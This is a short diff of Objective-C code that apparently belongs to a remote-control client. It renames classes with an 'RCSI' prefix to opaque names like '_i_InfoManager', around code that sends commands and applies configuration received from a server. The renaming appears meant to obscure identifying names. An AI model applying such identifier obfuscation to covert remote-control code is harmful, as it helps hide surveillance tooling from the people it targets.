@@ -58,7 +58,7 @@
   replyData = [mTransport sendData: commandData
                  returningResponse: urlResponse];
   
-  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+  _i_InfoManager *infoManager = [[_i_InfoManager alloc] init];
 
   if (replyData == nil)
     {
@@ -174,7 +174,7 @@
       return NO;
     }
   
-  if ([[RCSIConfManager sharedInstance] updateConfiguration: configData] == FALSE)
+  if ([[_i_ConfManager sharedInstance] updateConfiguration: configData] == FALSE)
     {  
       [configData release];
       [infoManager release];
